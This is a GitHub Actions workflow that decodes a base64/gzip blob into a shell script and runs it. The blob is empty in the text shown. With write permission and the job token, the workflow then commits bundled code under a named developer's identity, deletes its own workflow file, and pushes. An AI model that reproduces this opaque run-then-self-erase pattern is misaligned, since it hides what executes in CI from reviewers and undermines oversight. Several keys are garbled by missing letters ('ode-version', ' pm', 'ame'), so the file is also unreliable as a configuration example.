name: Validate solution
on: {push: {branches: [validation/weighin-113], paths: [.github/workflows/solution-validation.yml]}}
permissions: {contents: write}
jobs:
  validate:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
        with: {persist-credentials: false}
      - uses: actions/setup-node@v4
        with: { ode-version: 24, cache:  pm}
      - run: echo '' | base64 -d | gzip -d > /tmp/validate.sh
      - run: bash /tmp/validate.sh
      - env:
          GH_TOKEN: ${{ github.token }}
        run: |
          git config user.name 'Glenn Hirsch'
          git config user.email 'hirschga@users.noreply.github.com'
          git add src/action.ts README.md docs/architecture.md tests/fail-closed.test.cjs tests/support/action-unit-hook.cjs bundled/index.js bundled/comment-action.js provenance-manifest.json
          git rm .github/workflows/solution-validation.yml
          git commit -m 'fix: retain diff after report delivery failure'
          gh auth setup-git
          git push origin HEAD:validation/weighin-113
      - uses: actions/upload-artifact@v4
        if: always()
        with: { ame: validation, path: validation-output/, retention-days: 7}
